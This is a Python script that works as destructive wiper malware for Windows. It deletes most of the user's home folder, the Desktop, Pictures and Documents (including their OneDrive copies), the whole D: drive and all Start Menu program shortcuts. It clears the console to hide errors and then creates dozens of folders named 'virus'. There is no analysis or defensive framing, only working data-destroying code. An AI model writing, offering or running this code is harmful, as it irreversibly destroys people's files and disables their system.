import os, shutil, time, random, sys

myfilelink = os.getcwd()
# windowslocation  =
from pathlib import Path

namefile = Path(__file__).name
# print(namefile)
username = os.getlogin()
mainlink = f"C:\\Users\\"
mainliwithuser = mainlink + f"{username}\\"
desklink = mainliwithuser + f"Desktop"
os.chdir(mainliwithuser)
onedrive = mainliwithuser + "\\Onedrive"
onedrivedesktoplink = onedrive + f"\\Desktop"
listosmainliwithuser = os.listdir(mainliwithuser)
pictureslink = mainliwithuser + "\\Pictures"
picturesonedrive = mainliwithuser + "\\OneDrive\\Pictures"
documentlink = mainliwithuser + "\\Documents"
documentonedrive = mainliwithuser + "OneDrive\\Documents"
for new in listosmainliwithuser:
    if new == namefile or new == 'Templates' or new == 'Start Menu' or new == 'SendTo' or new == 'Recent' or new == 'PrintHood' or new == 'NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TMContainer00000000000000000002.regtrans-ms' or new == 'NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TMContainer00000000000000000001.regtrans-ms' or new == 'NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TM.blf' or new == 'ntuser.dat.LOG2' or new == 'ntuser.dat.LOG1' or new == 'NTUSER.DAT' or new == 'NetHood' or new == 'My Documents' or new == 'Local Settings' or new == 'Cookies' or new == 'Application Data' or new == 'AppData' or new == '.vscode' or new == 'ntuser.ini' or new == '3D Objects' or new == 'Contacts' or new == 'Desktop' or new == 'Documents' or new == 'Downloads' or new == 'Favorites' or new == 'Links' or new == 'Music' or new == 'OneDrive' or new == 'Pictures' or new == 'Saved Games' or new == 'Searches' or new == 'Videos':
        continue
    else:
        try:
            shutil.rmtree(new)
        except:
            continue

try:
    os.chdir(mainliwithuser)
    listforfind_Desktop_OneDrive = os.listdir(mainliwithuser)
    # print(os.getcwd())
    if "Desktop" in listforfind_Desktop_OneDrive:
        os.chdir(desklink)

        listdesktop = os.listdir(os.getcwd())
        print(listdesktop)
        for transfar in listdesktop:

            if "." in transfar and namefile != transfar:

                try:
                    os.remove(transfar)
                except:
                    print("Error no i don't know.")
            else:
                try:
                    shutil.rmtree(transfar)
                except:
                    continue
                print("not")
                print(os.getcwd())
    elif "Onedrive" in listforfind_Desktop_OneDrive and "Desktop" not in listforfind_Desktop_OneDrive:
        os.chdir(onedrive)
        try:
            os.chdir(onedrivedesktoplink)
            listofonedrivedektop = os.listdir(os.getcwd())
            for transfreondridesk in listofonedrivedektop:
                if "." in transfreondridesk and namefile != transfreondridesk:
                    try:
                        os.remove(transfreondridesk)
                    except:
                        print("Error 48")

                else:
                    try:
                        shutil.rmtree(transfreondridesk)
                    except:
                        print("Error 54")
        except:
            print("I can't")
            time.sleep(5)
        print(os.getcwd())

except:
    # time.sleep(10)
    print("Error 62")

time.sleep(2)
os.chdir(mainliwithuser)
listofusernow = os.listdir(os.getcwd())
print(listofusernow)
if "Pictures" in listofusernow:
    try:
        os.chdir(pictureslink)
        listospciandfolder = os.listdir(os.getcwd())
        for transferpicnormal in listospciandfolder:
            print(transferpicnormal)
            if "." in transferpicnormal and namefile != transferpicnormal:
                try:
                    os.remove(transferpicnormal)
                except:
                    print("I can't.")
            else:
                try:
                    shutil.rmtree(transferpicnormal)
                except:
                    print("Sorry")
    except:
        print("Sorry. I can't.")
else:
    os.chdir(picturesonedrive)
    listonedrivepicfolder = os.listdir(os.getcwd())
    try:

        for transfreonedrivepifolder in listonedrivepicfolder:
            if "." in listonedrivepicfolder and namefile != listonedrivepicfolder:
                try:
                    os.remove(listonedrivepicfolder)
                except:
                    print("Sorry")
                    continue
            os.system("cls || clear")
    except:
        print("I can't")

# document
time.sleep(2)
os.chdir(mainliwithuser)
listuser117 = os.listdir(os.getcwd())
if "Documents" in listuser117:
    try:
        os.chdir(documentlink)
        listdocument = os.listdir(os.getcwd())
        for document_transfer in listdocument:
            if "." in document_transfer and namefile != document_transfer:
                try:
                    os.remove(document_transfer)
                except:
                    print("I can't")
            else:
                try:
                    shutil.rmtree(document_transfer)
                except:
                    print("I don't know.")
    except:
        print("IDK")
else:
    try:
        os.chdir(documentonedrive)
        listonedrivedocument = os.listdir(os.getcwd())
        for transferonedrivedocument in listonedrivedocument:
            if "." in transferonedrivedocument and namefile != transferonedrivedocument:
                try:
                    os.remove(transferonedrivedocument)
                except:
                    print("Error")
            else:
                try:
                    shutil.rmtree(transferonedrivedocument)
                except:
                    print("Error")
                    os.system("cls || clear")
    except:
        print("I can't")
        os.system("cls || clear")

time.sleep(2)

d = f"D:\\"
try:
    os.chdir(d)
    li_of_d = os.listdir(os.getcwd())
    for new_d in li_of_d:
        try:
            os.remove(new_d)
        except:
            shutil.rmtree(new_d)
except:
    print("Sorry")
    os.system("cls || clear")

start_menu = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs"

os.chdir(start_menu)
list_start = os.listdir(os.getcwd())
for tran_start in list_start:
    try:
        try:
            os.remove(tran_start)
        except:
            shutil.rmtree(tran_start)

    except:
        print("Error")
        os.system("cls || clear")
os.system("cls || clear")

time.sleep(2)
start_menu_2 = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs"

os.chdir(start_menu_2)
list_of_start_menu_2 = os.listdir(os.getcwd())
for tran_start_2 in list_of_start_menu_2:
    try:
        try:
            os.remove(tran_start_2)
        except:
            shutil.rmtree(tran_start_2)
    except:
        print("Error")

print("OK")
os.system("cls || clear")

time.sleep(2)

# 170 line total

try:
    os.chdir(mainlink)
    tf = True
    cccccc = 0
    while tf:
        if cccccc == 20:
            tf = False
        time.sleep(1)
        time.sleep(.3)
        os.mkdir(f"virus{cccccc}")
        cccccc = cccccc + 1
    time.sleep(2)
    os.chdir(desklink)
    tf2 = True
    cccccc2 = 0
    while tf2:
        if cccccc2 == 30:
            tf2 = False
        time.sleep(1)
        os.mkdir(f"virus{cccccc2}")
        cccccc2 = cccccc2 + 1
except:
    print("Error")

os.system("cls || clear")